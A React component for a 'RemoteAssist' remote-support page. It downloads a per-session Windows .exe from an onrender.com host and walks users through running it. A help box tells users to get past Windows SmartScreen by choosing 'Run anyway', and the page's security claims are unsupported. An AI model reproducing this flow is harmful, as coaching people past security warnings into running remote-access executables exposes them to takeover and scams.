import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import { Loader2, MonitorDown, Download, CheckCircle2, ShieldCheck, ArrowRight, HelpCircle, RefreshCw } from 'lucide-react';
import { motion } from 'framer-motion';

const JoinSession = () => {
  const { sessionId: paramSessionId } = useParams<{ sessionId: string }>();
  const [sessionCode, setSessionCode] = useState(paramSessionId || '');
  const [name, setName] = useState('');
  const [isJoining, setIsJoining] = useState(false);
  const [hasDownloaded, setHasDownloaded] = useState(false);

  useEffect(() => {
    if (paramSessionId) {
      setSessionCode(paramSessionId);
    }
  }, [paramSessionId]);

  const triggerDownload = (targetCode: string) => {
    const cleanCode = targetCode.trim();
    if (!cleanCode) return;

    setIsJoining(true);

    const downloadUrl = `https://remote-assist-y8ot.onrender.com/api/sessions/${cleanCode}/download`;
    const a = document.createElement('a');
    a.href = downloadUrl;
    a.download = `RemoteAssist_Session_${cleanCode}.exe`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);

    setTimeout(() => {
      setIsJoining(false);
      setHasDownloaded(true);
    }, 1200);
  };

  const handleJoin = (e: React.FormEvent) => {
    e.preventDefault();
    if (!sessionCode.trim()) return;
    triggerDownload(sessionCode);
  };

  return (
    <div className="min-h-screen bg-slate-900 text-slate-100 flex flex-col justify-center py-12 px-4 sm:px-6 lg:px-8 relative overflow-hidden">
      {/* Background glow effects */}
      <div className="absolute top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[350px] bg-indigo-600/10 rounded-full blur-3xl pointer-events-none" />

      <div className="sm:mx-auto sm:w-full sm:max-w-md relative z-10 text-center">
        <div className="inline-flex justify-center items-center gap-3 mb-4">
          <div className="w-12 h-12 bg-indigo-600 rounded-xl flex items-center justify-center shadow-lg shadow-indigo-500/25">
            <MonitorDown className="w-7 h-7 text-white" />
          </div>
          <h1 className="text-3xl font-extrabold text-white tracking-tight">
            RemoteAssist
          </h1>
        </div>
        <p className="text-slate-400 text-sm">
          Secure, on-demand remote support for your PC
        </p>
      </div>

      <div className="mt-8 sm:mx-auto sm:w-full sm:max-w-lg relative z-10">
        <motion.div 
          initial={{ opacity: 0, y: 15 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-slate-800/90 backdrop-blur-md py-8 px-6 shadow-2xl rounded-2xl sm:px-10 border border-slate-700"
        >
          {!hasDownloaded ? (
            <form className="space-y-5" onSubmit={handleJoin}>
              <div>
                <label htmlFor="sessionCode" className="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-1.5">
                  9-Digit Session Key
                </label>
                <input
                  id="sessionCode"
                  name="sessionCode"
                  type="text"
                  required
                  maxLength={15}
                  value={sessionCode}
                  onChange={(e) => setSessionCode(e.target.value.replace(/[^0-9]/g, ''))}
                  placeholder="e.g. 157079689"
                  className="appearance-none block w-full px-4 py-3 bg-slate-900 border border-slate-600 rounded-xl shadow-inner text-white font-mono text-xl tracking-widest placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent transition-all"
                />
              </div>

              <div>
                <label htmlFor="name" className="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-1.5">
                  Your Name (Optional)
                </label>
                <input
                  id="name"
                  name="name"
                  type="text"
                  value={name}
                  onChange={(e) => setName(e.target.value)}
                  placeholder="e.g. Alex"
                  className="appearance-none block w-full px-4 py-2.5 bg-slate-900 border border-slate-600 rounded-xl text-slate-200 placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent transition-all text-sm"
                />
              </div>

              <div className="pt-2">
                <button
                  type="submit"
                  disabled={isJoining || !sessionCode.trim()}
                  className="w-full flex justify-center items-center gap-2.5 py-3.5 px-5 rounded-xl shadow-lg shadow-indigo-600/30 text-base font-bold text-white bg-indigo-600 hover:bg-indigo-500 active:scale-[0.99] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-slate-900 focus:ring-indigo-500 disabled:opacity-50 disabled:cursor-not-allowed transition-all"
                >
                  {isJoining ? (
                    <>
                      <Loader2 className="w-5 h-5 animate-spin" />
                      <span>Preparing Download...</span>
                    </>
                  ) : (
                    <>
                      <span>Join Support Session</span>
                      <ArrowRight className="w-5 h-5" />
                    </>
                  )}
                </button>
              </div>

              <div className="pt-4 border-t border-slate-700/60 flex items-center justify-center gap-2 text-xs text-slate-400">
                <ShieldCheck className="w-4 h-4 text-emerald-400" />
                <span>Zero installation required. Portable one-time session.</span>
              </div>
            </form>
          ) : (
            /* Post-Download Zoho Assist-Style 3-Step Instruction Card */
            <div className="space-y-6">
              <div className="text-center pb-2">
                <div className="inline-flex p-3 bg-emerald-500/10 text-emerald-400 rounded-full mb-3 border border-emerald-500/20">
                  <CheckCircle2 className="w-8 h-8" />
                </div>
                <h3 className="text-xl font-bold text-white">Your Support App is Ready!</h3>
                <p className="text-xs text-slate-400 mt-1">
                  Follow these 3 simple steps to connect with your technician:
                </p>
              </div>

              <div className="space-y-3">
                <div className="flex items-start gap-3.5 p-3.5 rounded-xl bg-slate-900/80 border border-slate-700">
                  <div className="w-7 h-7 rounded-full bg-indigo-600 text-white flex items-center justify-center font-bold text-xs shrink-0 mt-0.5">
                    1
                  </div>
                  <div className="text-sm">
                    <p className="font-semibold text-white">Locate the downloaded file</p>
                    <p className="text-xs text-slate-400 mt-0.5">
                      Check your browser downloads or Downloads folder for:
                    </p>
                    <code className="inline-block mt-1 bg-slate-800 text-indigo-300 px-2 py-0.5 rounded text-xs font-mono border border-slate-700">
                      RemoteAssist_Session_{sessionCode}.exe
                    </code>
                  </div>
                </div>

                <div className="flex items-start gap-3.5 p-3.5 rounded-xl bg-slate-900/80 border border-slate-700">
                  <div className="w-7 h-7 rounded-full bg-indigo-600 text-white flex items-center justify-center font-bold text-xs shrink-0 mt-0.5">
                    2
                  </div>
                  <div className="text-sm">
                    <p className="font-semibold text-white">Double-click to open</p>
                    <p className="text-xs text-slate-400 mt-0.5">
                      The lightweight app launches immediately without installing anything.
                    </p>
                  </div>
                </div>

                <div className="flex items-start gap-3.5 p-3.5 rounded-xl bg-slate-900/80 border border-slate-700">
                  <div className="w-7 h-7 rounded-full bg-emerald-600 text-white flex items-center justify-center font-bold text-xs shrink-0 mt-0.5">
                    3
                  </div>
                  <div className="text-sm">
                    <p className="font-semibold text-white">Instant Connection</p>
                    <p className="text-xs text-slate-400 mt-0.5">
                      The floating support badge will appear and your technician can assist you.
                    </p>
                  </div>
                </div>
              </div>

              {/* Windows SmartScreen Help Box */}
              <div className="p-3 bg-amber-500/10 border border-amber-500/20 rounded-xl text-xs text-amber-200/90 flex items-start gap-2.5">
                <HelpCircle className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
                <div>
                  <span className="font-semibold text-amber-300">If Windows SmartScreen appears:</span>
                  <p className="mt-0.5">
                    Click <b>&quot;More info&quot;</b> and then click <b>&quot;Run anyway&quot;</b> to start the portable support session.
                  </p>
                </div>
              </div>

              <div className="pt-2 flex items-center justify-between text-xs text-slate-400">
                <button
                  type="button"
                  onClick={() => triggerDownload(sessionCode)}
                  className="flex items-center gap-1.5 text-indigo-400 hover:text-indigo-300 font-medium transition-colors"
                >
                  <RefreshCw className="w-3.5 h-3.5" />
                  <span>Didn&apos;t download? Click here</span>
                </button>
                <button
                  type="button"
                  onClick={() => setHasDownloaded(false)}
                  className="text-slate-400 hover:text-white transition-colors"
                >
                  Change Session Key
                </button>
              </div>
            </div>
          )}
        </motion.div>
      </div>

      <div className="mt-8 text-center text-xs text-slate-500 relative z-10">
        <p>RemoteAssist &copy; {new Date().getFullYear()} &middot; End-to-End Encrypted WebRTC Support</p>
      </div>
    </div>
  );
};

export default JoinSession;
